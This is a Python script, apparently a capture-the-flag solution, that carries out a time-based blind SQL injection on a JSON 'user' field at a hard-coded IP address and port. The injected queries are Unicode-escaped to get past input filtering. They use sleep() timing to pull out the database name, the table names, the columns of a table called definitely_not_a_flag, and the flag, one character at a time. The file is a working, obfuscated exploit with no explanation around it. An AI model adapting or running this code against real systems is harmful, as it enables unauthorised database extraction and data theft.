from requests import post
from time import time
from json import dumps

url = "http://178.128.35.180:32000"
headers = {'content-type': 'application/json'}
payload = {"user":""}

def json_update(query_, mode):
	payload['user'] = query_
	Json = dumps(payload).replace("\\\\", "\\")
	if mode == '1':
		print("[*] Json Data : {}".format(Json))
	return Json


def get_request(query, mode, string, Len):
	if mode == '1':
		first_time = time()
		res = post(url, data=json_update(query, '1'), headers=headers)
		second_time = time()
		if res.text:
			print("[*] Response Content : {}".format(res.text))
		else:
			print("[*] Response Content : None")
		print("[*] Sleep : {}\n-".format(second_time - first_time))
	elif mode == '2':
		for i in range(100):
			first_time = time()
			if i < 10:
				unicode_ = "\\u003" + str(i)
			elif i >= 10 and i < 20:
				unicode_ = "\\u0031\\u003" + str(i)[1]
			elif i >= 20 and i < 30:
				unicode_ = "\\u0032\\u003" + str(i)[1]
			elif i >= 30 and i < 40:
				unicode_ = "\\u0033\\u003" + str(i)[1]
			elif i >= 40 and i < 50:
				unicode_ = "\\u0034\\u003" + str(i)[1]
			elif i >= 50 and i < 60:
				unicode_ = "\\u0035\\u003" + str(i)[1]
			elif i >= 60 and i < 70:
				unicode_ = "\\u0036\\u003" + str(i)[1]
			elif i >= 70 and i < 80:
				unicode_ = "\\u0037\\u003" + str(i)[1]
			elif i >= 80 and i < 90:
				unicode_ = "\\u0038\\u003" + str(i)[1]
			elif i >= 90 and i < 100:
				unicode_ = "\\u0039\\u003" + str(i)[1]
			else:
				unicode_ = "\\u0031\\u0030\\u0030"
			post(url, data=json_update(query.format(unicode_),'0'), headers=headers)
			second_time = time()

			if second_time - first_time >= 4.9:
				print("[*] Sleep : {}".format(second_time - first_time))
				print("[*] {} : {}\n-".format(string,i))
				break
	elif mode == '3':
		result = ''
		for j in range(1, Len + 1):
			unicode__ = "\\u003" + str(j)
			for i in range(33, 128):
				if i >= 33 and i < 40:
					unicode_ = "\\u0033\\u003" + str(i)[1]
				elif i >= 40 and i < 50:
					unicode_ = "\\u0034\\u003" + str(i)[1]
				elif i >= 50 and i < 60:
					unicode_ = "\\u0035\\u003" + str(i)[1]
				elif i >= 60 and i < 70:
					unicode_ = "\\u0036\\u003" + str(i)[1]
				elif i >= 70 and i < 80:
					unicode_ = "\\u0037\\u003" + str(i)[1]
				elif i >= 80 and i < 90:
					unicode_ = "\\u0038\\u003" + str(i)[1]
				elif i >= 90 and i < 100:
					unicode_ = "\\u0039\\u003" + str(i)[1]
				elif i >= 100 and i < 110:
					unicode_ = "\\u0031\\u0030\\u003" + str(i)[2]
				elif i >= 110 and i < 120:
					unicode_ = "\\u0031\\u0031\\u003" + str(i)[2]
				elif i >= 120 and i < 130:
					unicode_ = "\\u0031\\u0032\\u003" + str(i)[2]
				else:
					unicode_= "\\u0031\\u0033\\u003" + str(i)[2]
				first_time = time()
				post(url, data=json_update(query.format(unicode__, unicode_),'0'), headers=headers)
				second_time = time()

				if second_time - first_time >= 4.9:
					result += chr(i)
					break
		print("[*] {} : {}".format(string, result))
		print("-")

def main():
	get_request("\\u0027\\u0020\\u006f\\u0072\\u0020\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u0023", '1', '', 0)
	get_request("\\u0027\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0028\\u0064\\u0061\\u0074\\u0061\\u0062\\u0061\\u0073\\u0065\\u0028\\u0029\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023",'2', 'Database Length', 0)
	get_request("\\u0027\\u0020\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0061\\u0073\\u0063\\u0069\\u0069\\u0028\\u0073\\u0075\\u0062\\u0073\\u0074\\u0072\\u0028\\u0064\\u0061\\u0074\\u0061\\u0062\\u0061\\u0073\\u0065\\u0028\\u0029\\u002c{}\\u002c\\u0031\\u0029\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023", '3', 'Database', 8)
	get_request("\\u0027\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u0063\\u006f\\u0075\\u006e\\u0074\\u0028\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u006e\\u0061\\u006d\\u0065\\u0029\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0069\\u006e\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u002e\\u0074\\u0061\\u0062\\u006c\\u0065\\u0073\\u0020\\u0077\\u0068\\u0065\\u0072\\u0065\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u003d\\u0027\\u0064\\u0062\\u005f\\u006d\\u0038\\u0034\\u0035\\u0032\\u0027\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023", '2', "select count(*) information_schema.tables where table_schema='db_m8452';",0)
	get_request("\\u0027\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0028\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u006e\\u0061\\u006d\\u0065\\u0029\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0069\\u006e\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u002e\\u0074\\u0061\\u0062\\u006c\\u0065\\u0073\\u0020\\u0077\\u0068\\u0065\\u0072\\u0065\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u003d\\u0027\\u0064\\u0062\\u005f\\u006d\\u0038\\u0034\\u0035\\u0032\\u0027\\u0020\\u006c\\u0069\\u006d\\u0069\\u0074\\u0020\\u0030\\u002c\\u0031\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023", "2", "select length(table_name) from information_schema.tables where table_schema='db_m8452' limit 0,1", 0)
	get_request("\\u0027\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0061\\u0073\\u0063\\u0069\\u0069\\u0028\\u0073\\u0075\\u0062\\u0073\\u0074\\u0072\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u006e\\u0061\\u006d\\u0065\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0069\\u006e\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u002e\\u0074\\u0061\\u0062\\u006c\\u0065\\u0073\\u0020\\u0077\\u0068\\u0065\\u0072\\u0065\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u003d\\u0027\\u0064\\u0062\\u005f\\u006d\\u0038\\u0034\\u0035\\u0032\\u0027\\u0020\\u006c\\u0069\\u006d\\u0069\\u0074\\u0020\\u0030\\u002c\\u0031\\u0029\\u002c{}\\u002c\\u0031\\u0029\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023","3","First Table",21)
	get_request("\\u0027\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0028\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u006e\\u0061\\u006d\\u0065\\u0029\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0069\\u006e\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u002e\\u0074\\u0061\\u0062\\u006c\\u0065\\u0073\\u0020\\u0077\\u0068\\u0065\\u0072\\u0065\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u003d\\u0027\\u0064\\u0062\\u005f\\u006d\\u0038\\u0034\\u0035\\u0032\\u0027\\u0020\\u006c\\u0069\\u006d\\u0069\\u0074\\u0020\\u0031\\u002c\\u0031\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023", '2',"select length(table_name) from information_schema.tables where table_schema='db_m8452' limit 1,1", 0)
	get_request("\\u0027\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0061\\u0073\\u0063\\u0069\\u0069\\u0028\\u0073\\u0075\\u0062\\u0073\\u0074\\u0072\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u006e\\u0061\\u006d\\u0065\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0069\\u006e\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u002e\\u0074\\u0061\\u0062\\u006c\\u0065\\u0073\\u0020\\u0077\\u0068\\u0065\\u0072\\u0065\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u003d\\u0027\\u0064\\u0062\\u005f\\u006d\\u0038\\u0034\\u0035\\u0032\\u0027\\u0020\\u006c\\u0069\\u006d\\u0069\\u0074\\u0020\\u0031\\u002c\\u0031\\u0029\\u002c{}\\u002c\\u0031\\u0029\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023","3","Second Table", 5)
	get_request("\\u0027\\u0020\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0028\\u0063\\u006f\\u006c\\u0075\\u006d\\u006e\\u005f\\u006e\\u0061\\u006d\\u0065\\u0029\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0069\\u006e\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u002e\\u0063\\u006f\\u006c\\u0075\\u006d\\u006e\\u0073\\u0020\\u0077\\u0068\\u0065\\u0072\\u0065\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u006e\\u0061\\u006d\\u0065\\u003d\\u0027\\u0064\\u0065\\u0066\\u0069\\u006e\\u0069\\u0074\\u0065\\u006c\\u0079\\u005f\\u006e\\u006f\\u0074\\u005f\\u0061\\u005f\\u0066\\u006c\\u0061\\u0067\\u0027\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023","2", "Column Length (feat definitely_not_a_flag)", 0)
	get_request("\\u0027\\u0020\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0061\\u0073\\u0063\\u0069\\u0069\\u0028\\u0073\\u0075\\u0062\\u0073\\u0074\\u0072\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u0063\\u006f\\u006c\\u0075\\u006d\\u006e\\u005f\\u006e\\u0061\\u006d\\u0065\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0069\\u006e\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u002e\\u0063\\u006f\\u006c\\u0075\\u006d\\u006e\\u0073\\u0020\\u0077\\u0068\\u0065\\u0072\\u0065\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u006e\\u0061\\u006d\\u0065\\u003d\\u0027\\u0064\\u0065\\u0066\\u0069\\u006e\\u0069\\u0074\\u0065\\u006c\\u0079\\u005f\\u006e\\u006f\\u0074\\u005f\\u0061\\u005f\\u0066\\u006c\\u0061\\u0067\\u0027\\u0029\\u002c{}\\u002c\\u0031\\u0029\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023","3","Column (feat definitely_not_a_flag)",4)
	get_request("\\u0027\\u0020\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0028\\u0066\\u006c\\u0061\\u0067\\u0029\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0064\\u0065\\u0066\\u0069\\u006e\\u0069\\u0074\\u0065\\u006c\\u0079\\u005f\\u006e\\u006f\\u0074\\u005f\\u0061\\u005f\\u0066\\u006c\\u0061\\u0067\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023","2","flag length",0)
	get_request("\\u0027\\u0020\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0061\\u0073\\u0063\\u0069\\u0069\\u0028\\u0073\\u0075\\u0062\\u0073\\u0074\\u0072\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u0066\\u006c\\u0061\\u0067\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0064\\u0065\\u0066\\u0069\\u006e\\u0069\\u0074\\u0065\\u006c\\u0079\\u005f\\u006e\\u006f\\u0074\\u005f\\u0061\\u005f\\u0066\\u006c\\u0061\\u0067\\u0029\\u002c{}\\u002c\\u0031\\u0029\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023", "3", "FLAG", 33)


if __name__ == "__main__":
	print("[*] Start\n-")
	main()